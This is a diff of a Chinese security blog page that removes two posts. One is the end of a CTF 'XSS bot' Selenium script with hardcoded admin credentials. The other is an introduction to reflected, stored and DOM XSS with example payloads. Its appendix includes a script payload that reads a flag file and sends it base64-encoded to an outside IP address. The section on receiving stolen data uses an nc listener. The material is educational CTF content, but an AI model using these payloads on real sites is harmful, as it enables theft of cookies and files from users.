-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding:utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> selenium</div><div class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver  </div><div class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys  </div><div class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> WebDriverException</div><div class="line"><span class="keyword">import</span> os </div><div class="line"><span class="keyword">import</span> time </div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">from</span> pyvirtualdisplay <span class="keyword">import</span> Display</div><div class="line"></div><div class="line">display = Display(visible=<span class="number">0</span>, size=(<span class="number">800</span>,<span class="number">800</span>))</div><div class="line">display.start()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>):</div><div class="line"></div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		browser = webdriver.Firefox()</div><div class="line">		browser.set_page_load_timeout(<span class="number">10</span>)</div><div class="line">		browser.set_script_timeout(<span class="number">10</span>)</div><div class="line"></div><div class="line"></div><div class="line">		url = <span class="string">"http://52.80.63.91/login.php"</span>  	</div><div class="line">		browser.get(url)</div><div class="line"></div><div class="line">		elem = browser.find_element_by_name(<span class="string">"user"</span>)</div><div class="line">		elem.clear()</div><div class="line">		elem.send_keys(<span class="string">'admin'</span>)</div><div class="line">		elem = browser.find_element_by_name(<span class="string">"pass"</span>)</div><div class="line">		elem.clear()</div><div class="line">		elem.send_keys(<span class="string">'admmin332indadmin33213'</span>)</div><div class="line">		elem = browser.find_element_by_name(<span class="string">"login"</span>)</div><div class="line">		elem.click()</div><div class="line"></div><div class="line">		<span class="keyword">print</span> <span class="string">"login success"</span></div><div class="line">	</div><div class="line">		browser.add_cookie(&#123;<span class="string">'name'</span>: <span class="string">'admin'</span>,</div><div class="line">		 <span class="string">'value'</span> : <span class="string">'arandomstring'</span>,</div><div class="line">		 <span class="string">'path'</span> : <span class="string">'/adminshigesha233e3333/'</span>&#125;)</div><div class="line"></div><div class="line">		<span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">			<span class="keyword">try</span>:</div><div class="line">				browser.switch_to_alert().accept()</div><div class="line"></div><div class="line">			<span class="keyword">except</span> selenium.common.exceptions.NoAlertPresentException:</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line">		<span class="keyword">print</span> browser.title</div><div class="line">		<span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div><div class="line">		time.sleep(<span class="number">10</span>)</div><div class="line">		browser.quit()</div><div class="line">		time.sleep(<span class="number">1</span>)</div><div class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e: </div><div class="line">		<span class="keyword">print</span> <span class="string">"[ERROR] "</span>+str(e)</div><div class="line">		<span class="comment">#important</span></div><div class="line">		browser.quit()</div><div class="line"></div><div class="line"></div><div class="line">url2 = <span class="string">'http://xxxx/cl33e3ar5ql.php'</span></div><div class="line">r = s.get(url2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.text</div><div class="line"><span class="keyword">print</span> time.strftime(<span class="string">"%Y-%m-%d %X"</span>, time.localtime())</div></pre></td></tr></table></figure>
-<p>上面的代码通过setkey模拟登录，然后设置后台的cookie，每次payload执行2次，然后清理掉admin除预留信息以外的所有payload，避免恶意payload导致的所有payload无效。</p>
-<p>配合crontab可以保证bot的持久性，如果不放心bot的稳定性，还可以在脚本执行结束后，执行命令kill掉所有的firefox残留进程。</p>
-<p>到此为止，一个完整的xss bot就完成了，虽然可能不是最完美的解决方案，希望会有更好的解决办法:&gt;</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/21/xss简介/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/21/xss简介/" itemprop="url">xss简介</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-21T16:24:13+08:00">
-                2017-09-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>自从xss被发现之后，OWASP上经常会出现它的身影。一开始xss作为一种攻击方式，应用并不算广。但是随着漏洞利用的深入钻研，安全研究者们逐渐发现xss的危害，特别是在用户授权与管理方面。</p>
-<p>国内外各大web安全检测厂商，已经在其产品中加入了xss检查、过滤等功能。</p>
-<h3 id="1、XSS原理"><a href="#1、XSS原理" class="headerlink" title="1、XSS原理"></a>1、XSS原理</h3><p>JavaScript可以用来获取用户的Cookie、改变网页内容、URL跳转。于是，我们就可以从存在XSS漏洞的网站中，盗取用户Cookie、黑掉页面、导航到恶意网站。</p>
-<p>通常使用<script src="http://www.secbug.org/x.txt"></script>方式来加载外部脚本，而在x.txt中就存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。</p>
-<p>备注：JavaScript加载外部的代码文件可以是任意扩展名(无扩展名也可以)</p>
-<h3 id="2、XSS类型"><a href="#2、XSS类型" class="headerlink" title="2、XSS类型"></a>2、XSS类型</h3><h4 id="2-1-反射型XSS"><a href="#2-1-反射型XSS" class="headerlink" title="2.1 反射型XSS"></a>2.1 反射型XSS</h4><p>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。</p>
-<p>XSS的Payload一般是写在URL中，之后设法让被害者点击这个链接。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">     username = _GET[<span class="string">'username'</span>];  </div><div class="line">     <span class="keyword">echo</span> $username;  </div><div class="line"><span class="meta">?&gt;</span>  </div><div class="line"> </div><div class="line">利用样例：</div><div class="line">http:<span class="comment">//www.secbug.org/xss.php?username=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></div></pre></td></tr></table></figure>
-<h4 id="2-2-存储型XSS"><a href="#2-2-存储型XSS" class="headerlink" title="2.2 存储型XSS"></a>2.2 存储型XSS</h4><p>存储型XSS又被称为持久性XSS，存储型XSS是最危险的一种跨站脚本。</p>
-<p>存储型XSS被服务器端接收并存储，当用户访问该网页时，这段XSS代码被读出来响应给浏览器。</p>
-<p>反射型XSS与DOM型XSS都必须依靠用户手动去触发，而存储型XSS却不需要。</p>
-<p>测试步骤如下，以留言板为例：</p>
-<p>（1）添加正常的留言，使用Firebug快速寻找显示标签</p>
-<p>（2）判断内容输出（显示）的地方是在标签内还是在标签属性内，或者在其他地方。如果显示区域不在HTML属性内，则可以直接使用xss代码注入。如果在属性内，需要先闭合标签再写入xss代码。如果不能得知内容输出的具体位置，则可以使用模糊测试方案。</p>
-<p>（3）在插入xss payload代码后，重新加载留言页面，xss代码被浏览器执行。</p>
-<h4 id="2-3-DOM-XSS"><a href="#2-3-DOM-XSS" class="headerlink" title="2.3 DOM XSS"></a>2.3 DOM XSS</h4><p>DOM的全称为Document Object Model，即文档对象模型。</p>
-<p>基于DOM型的XSS是不需要与服务器交互的，它只发生在客户端处理数据阶段。简单理解DOM XSS就是出现在javascript代码中的xss漏洞。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;  </div><div class="line"><span class="keyword">var</span> temp = document.URL;<span class="comment">//获取URL  </span></div><div class="line"><span class="keyword">var</span> index = document.URL.indexOf(<span class="string">"content="</span>)+<span class="number">4</span>;  </div><div class="line"><span class="keyword">var</span> par = temp.substring(index);  </div><div class="line">document.write(decodeURI(par));<span class="comment">//输入获取内容  </span></div><div class="line">&lt;/script&gt;  </div><div class="line"></div><div class="line">利用样例：</div><div class="line">http:<span class="comment">//www.secbug.org/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></div></pre></td></tr></table></figure>
-<p>这种利用也需要受害者点击链接来触发，DOM型XSS是前端代码中存在了漏洞，而反射型是后端代码中存在了漏洞。</p>
-<p>反射型和存储型xss是服务器端代码漏洞造成的，payload在响应页面中，在dom xss中，payload不在服务器发出的HTTP响应页面中，当客户端脚本运行时（渲染页面时），payload才会加载到脚本中执行。</p>
-<h3 id="3、利用工具"><a href="#3、利用工具" class="headerlink" title="3、利用工具"></a>3、利用工具</h3><h4 id="3-1-xss接收工具"><a href="#3-1-xss接收工具" class="headerlink" title="3.1 xss接收工具"></a>3.1 xss接收工具</h4><p>谈到xss的利用工具，这里不得不提到火日大神，其在github上的工具<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="external">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p>
-<p>这个工具是ctf中xss应用的经典工具</p>
-<p><strong>另外一个工具就是nc</strong></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nc -l -p 8080</span></div><div class="line">GET /1.jpg HTTP/1.1</div><div class="line">Host: 10.254.20.127:8080</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh,zh-CN;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Connection: keep-alive</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
-<p>当外界请求<a href="http://10.254.20.127:8080/1.jpg的时候，就会出现上面的信息。" target="_blank" rel="external">http://10.254.20.127:8080/1.jpg的时候，就会出现上面的信息。</a></p>
-<h4 id="3-2-xss检测工具"><a href="#3-2-xss检测工具" class="headerlink" title="3.2 xss检测工具"></a>3.2 xss检测工具</h4><p>xss检测工具很多，现在xsser、xssf</p>
-<p>说真的，两个检测工具不怎么好用，还不如手工呢！</p>
-<p>另外就是xssor，可以访问</p>
-<p><a href="https://github.com/evilcos/xssor2" target="_blank" rel="external">https://github.com/evilcos/xssor2</a></p>
-<p><a href="http://xssor.io/" target="_blank" rel="external">http://xssor.io/</a></p>
-<h3 id="4、附录"><a href="#4、附录" class="headerlink" title="4、附录"></a>4、附录</h3><p>xss一般请求方式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?evilcode=&lt;script&gt;&lt;img src=&quot;http://xxxx/xss.jpg&quot;/&gt;&lt;/script&gt;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?evalcode=&lt;script&gt;var xmlhttp= new XMLHttpRequest();xmlhttp.open(&quot;GET&quot;,&quot;file:///var/www/html/flag.php&quot;,true);xmlhttp.onload = function () &#123;content = btoa(xmlhttp.responseText);window.location.href=&quot;http://118.190.78.155:8080/index.php?a=&quot;%2bcontent;&#125;;xmlhttp.send(null);&lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>btoa(&quot;str&quot;)   ===&gt;  base64加密字符串</p>
-<p>atob(&quot;ABSCRF==&quot;)    ===&gt;  base64解密字符串</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2284,7 +2231,7 @@
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">129</span>
+                <span class="site-state-item-count">132</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2295,7 +2242,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-count">16</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2306,7 +2253,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">54</span>
+                <span class="site-state-item-count">55</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -2531,6 +2478,8 @@
 
 
   
+
+
 
 
 
